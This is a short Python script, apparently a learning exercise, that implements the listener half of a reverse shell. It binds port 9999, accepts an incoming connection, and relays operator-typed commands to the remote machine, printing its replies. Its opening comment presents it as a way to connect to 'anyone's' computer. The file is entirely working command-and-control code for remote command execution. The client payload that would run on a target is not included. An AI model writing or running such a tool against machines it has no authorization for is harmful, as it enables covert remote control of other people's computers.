# reverse shell is a way to connect anyone's person computer
# using reverse connections

import socket
import sys

def create_socket():
    try:
        global host
        global port 
        global s
        host = ""
        port = 9999
        s = socket.socket()
        return s
    except socket.error as err:
        assert str(err)

# socket is just a connection, you need to tell the socket
# where it has to be connected to exchange data.
def bind_socket():
    try:
        global host
        global port
        global s 

        print(f"Binding the port {str(port)}")
        s.bind((host, port))
        s.listen(5) # no. of bad requests socket can tolerate
    except socket.error as ex:
        print(f"Failure while binding the connection. {str(ex)} Retrying ....")
        bind_socket() # if connection fails, try again to bind socket

# establish/ accept connections from socket's computer
def socket_accept():
    """
    if s.listen is absent while binding socket, connection can't be established
    """
    # returns a connection object and list
    # of IP Address and port  of key with whom the connection is made
    conn, addresses = s.accept() 
    print("Connection has been established with ", *addresses)
    send_commands(conn)
    conn.close()

def send_commands(conn):
    while 1:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
            break
        encoded_data = str.encode(cmd)
        if encoded_data:
            conn.send(encoded_data)
            client_response = str(conn.recv(1024), encoding ="utf-8")
            print(f' Client Response {client_response}')

def main():
    create_socket()
    bind_socket()
    socket_accept()

main()
